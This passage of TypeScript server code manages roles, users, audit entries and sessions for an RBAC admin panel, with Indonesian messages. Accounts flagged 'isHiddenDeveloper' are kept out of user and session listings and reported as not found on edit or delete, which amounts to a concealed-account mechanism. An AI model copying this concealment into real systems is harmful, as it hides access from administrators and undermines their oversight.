      .trim()
      .replace(/[^a-z0-9]+/g, '_')
      .replace(/^_+|_+$/g, '');
    if (!slug) return { ok: false, status: 400, message: 'ID peran tidak valid.' };
    if (this.state.roles.some((r) => r.id === slug)) {
      return { ok: false, status: 409, message: `ID peran "${slug}" sudah terdaftar.` };
    }

    const role: RoleDefinition = {
      id: slug,
      name: cleanName,
      description: String(input.description || '').trim(),
      isSystem: false,
      permissions: sanitizePermissions(input.permissions),
      updatedAt: new Date().toISOString()
    };
    this.state.roles.push(role);
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'ROLE_CREATED',
      resource: 'rbac-admin',
      targetId: role.id,
      status: 'ALLOWED',
      ip,
      detail: `Peran baru "${role.name}" (${role.id}) dibuat.`
    });
    return { ok: true, role };
  }

  public updateRole(
    roleId: string,
    input: { name?: string; description?: string; permissions?: unknown },
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true; role: RoleDefinition } | { ok: false; status: number; message: string } {
    const role = this.state.roles.find((r) => r.id === roleId);
    if (!role) return { ok: false, status: 404, message: 'Peran tidak ditemukan.' };

    if (typeof input.name === 'string' && input.name.trim()) {
      role.name = input.name.trim();
    }
    if (typeof input.description === 'string') {
      role.description = input.description.trim();
    }
    if (input.permissions !== undefined) {
      const nextPerms = sanitizePermissions(input.permissions);
      // Cegah penguncian diri sendiri untuk role it_admin agar selalu ada pengelola RBAC
      if (role.id === 'it_admin') {
        nextPerms['rbac-admin'] = ['view', 'create', 'update', 'delete'];
        nextPerms['it-traceability'] = Array.from(new Set([...(nextPerms['it-traceability'] || []), 'view']));
      }
      role.permissions = nextPerms;
    }
    role.updatedAt = new Date().toISOString();
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'ROLE_UPDATED',
      resource: 'rbac-admin',
      targetId: role.id,
      status: 'ALLOWED',
      ip,
      detail: `Matriks izin peran "${role.name}" diperbarui.`
    });
    return { ok: true, role };
  }

  public deleteRole(
    roleId: string,
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true } | { ok: false; status: number; message: string } {
    const role = this.state.roles.find((r) => r.id === roleId);
    if (!role) return { ok: false, status: 404, message: 'Peran tidak ditemukan.' };
    if (role.isSystem) {
      return { ok: false, status: 400, message: 'Peran bawaan sistem tidak dapat dihapus.' };
    }
    if (this.state.users.some((u) => u.roleId === roleId)) {
      return { ok: false, status: 409, message: 'Masih ada pengguna yang menggunakan peran ini. Pindahkan peran mereka terlebih dahulu.' };
    }
    this.state.roles = this.state.roles.filter((r) => r.id !== roleId);
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'ROLE_DELETED',
      resource: 'rbac-admin',
      targetId: roleId,
      status: 'ALLOWED',
      ip,
      detail: `Peran kustom "${role.name}" (${roleId}) dihapus.`
    });
    return { ok: true };
  }

  public listUsers(): ServerUserPublic[] {
    return this.state.users.filter((u) => !u.isHiddenDeveloper).map((u) => this.toPublicUser(u));
  }

  public createUser(
    input: {
      username: string;
      password: string;
      fullName: string;
      email?: string;
      roleId: string;
      department?: string;
      isActive?: boolean;
    },
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true; user: ServerUserPublic } | { ok: false; status: number; message: string } {
    const username = String(input.username || '').trim().toLowerCase();
    const fullName = String(input.fullName || '').trim();
    const password = String(input.password || '');
    const roleId = String(input.roleId || '').trim();

    if (!/^[a-z0-9._-]{3,32}$/.test(username)) {
      return { ok: false, status: 400, message: 'Username harus 3–32 karakter (huruf kecil, angka, titik, garis bawah, atau hubung).' };
    }
    if (!fullName) return { ok: false, status: 400, message: 'Nama lengkap wajib diisi.' };
    if (password.length < 6) return { ok: false, status: 400, message: 'Kata sandi awal minimal 6 karakter.' };
    if (!this.state.roles.some((r) => r.id === roleId)) {
      return { ok: false, status: 400, message: 'Peran RBAC tidak ditemukan.' };
    }
    if (this.state.users.some((u) => u.username.toLowerCase() === username)) {
      return { ok: false, status: 409, message: `Username "${username}" sudah digunakan.` };
    }

    const now = new Date().toISOString();
    const record: ServerUserRecord = {
      id: `usr-${crypto.randomUUID().slice(0, 8)}`,
      username,
      fullName,
      email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
      roleId,
      department: String(input.department || 'Umum').trim(),
      isActive: input.isActive !== false,
      passwordHash: hashPassword(password),
      createdAt: now,
      updatedAt: now
    };
    this.state.users.push(record);
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'USER_CREATED',
      resource: 'rbac-admin',
      targetId: record.id,
      status: 'ALLOWED',
      ip,
      detail: `Akun baru "${record.username}" dibuat dengan peran ${record.roleId}.`
    });
    return { ok: true, user: this.toPublicUser(record) };
  }

  private countActiveRbacAdmins(excludeUserId?: string): number {
    const adminRoles = new Set(
      this.state.roles
        .filter((r) => r.permissions['rbac-admin']?.includes('update') && r.permissions['rbac-admin']?.includes('view'))
        .map((r) => r.id)
    );
    return this.state.users.filter(
      (u) => !u.isHiddenDeveloper && u.id !== excludeUserId && u.isActive && adminRoles.has(u.roleId)
    ).length;
  }

  public updateUser(
    userId: string,
    input: {
      fullName?: string;
      email?: string;
      roleId?: string;
      department?: string;
      isActive?: boolean;
      newPassword?: string;
    },
    actorUserId: string,
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true; user: ServerUserPublic } | { ok: false; status: number; message: string } {
    const user = this.state.users.find((u) => u.id === userId);
    if (!user || user.isHiddenDeveloper) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };

    const nextRoleId = typeof input.roleId === 'string' ? input.roleId.trim() : user.roleId;
    if (!this.state.roles.some((r) => r.id === nextRoleId)) {
      return { ok: false, status: 400, message: 'Peran RBAC tidak valid.' };
    }

    const nextActive = typeof input.isActive === 'boolean' ? input.isActive : user.isActive;
    const nextRoleObj = this.state.roles.find((r) => r.id === nextRoleId);
    const nextHasAdmin = Boolean(nextRoleObj?.permissions['rbac-admin']?.includes('update'));

    if ((!nextActive || !nextHasAdmin) && this.countActiveRbacAdmins(user.id) === 0) {
      return {
        ok: false,
        status: 400,
        message: 'Tidak dapat menonaktifkan atau mencabut hak admin dari satu-satunya pengelola RBAC aktif.'
      };
    }

    if (user.id === actorUserId && !nextActive) {
      return { ok: false, status: 400, message: 'Anda tidak dapat menonaktifkan akun Anda sendiri yang sedang aktif.' };
    }

    if (typeof input.fullName === 'string' && input.fullName.trim()) user.fullName = input.fullName.trim();
    if (typeof input.email === 'string' && input.email.trim()) user.email = input.email.trim();
    if (typeof input.department === 'string' && input.department.trim()) user.department = input.department.trim();
    user.roleId = nextRoleId;
    user.isActive = nextActive;

    if (typeof input.newPassword === 'string' && input.newPassword.length > 0) {
      if (input.newPassword.length < 6) {
        return { ok: false, status: 400, message: 'Kata sandi baru minimal 6 karakter.' };
      }
      user.passwordHash = hashPassword(input.newPassword);
    }

    user.updatedAt = new Date().toISOString();

    if (!user.isActive) {
      this.state.sessions = this.state.sessions.filter((s) => s.userId !== user.id);
    }

    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'USER_UPDATED',
      resource: 'rbac-admin',
      targetId: user.id,
      status: 'ALLOWED',
      ip,
      detail: `Akun "${user.username}" diperbarui (peran: ${user.roleId}, aktif: ${user.isActive ? 'Ya' : 'Tidak'}).`
    });
    return { ok: true, user: this.toPublicUser(user) };
  }

  public deleteUser(
    userId: string,
    actorUserId: string,
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true } | { ok: false; status: number; message: string } {
    if (userId === actorUserId) {
      return { ok: false, status: 400, message: 'Anda tidak dapat menghapus akun yang sedang digunakan.' };
    }
    const user = this.state.users.find((u) => u.id === userId);
    if (!user || user.isHiddenDeveloper) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
    if (this.countActiveRbacAdmins(user.id) === 0) {
      return { ok: false, status: 400, message: 'Tidak dapat menghapus satu-satunya pengelola RBAC aktif.' };
    }

    this.state.users = this.state.users.filter((u) => u.id !== userId);
    this.state.sessions = this.state.sessions.filter((s) => s.userId !== userId);
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'USER_DELETED',
      resource: 'rbac-admin',
      targetId: userId,
      status: 'ALLOWED',
      ip,
      detail: `Akun "${user.username}" dihapus dari server.`
    });
    return { ok: true };
  }

  public listActiveSessions(currentSessionId?: string): ServerSessionSummary[] {
    this.pruneExpiredSessions();
    return this.state.sessions
      .filter((s) => {
        const u = this.state.users.find((usr) => usr.id === s.userId);
        return Boolean(u && !u.isHiddenDeveloper);
      })
      .map((s) => {
        const u = this.state.users.find((usr) => usr.id === s.userId);
        const r = u ? this.state.roles.find((rl) => rl.id === u.roleId) : undefined;
        return {
          ...s,
          username: u?.username ?? 'unknown',
          fullName: u?.fullName ?? 'Pengguna Tidak Dikenal',
          roleId: u?.roleId ?? '-',
          roleName: r?.name ?? '-',
          isCurrent: s.id === currentSessionId
        };
      });
  }
}
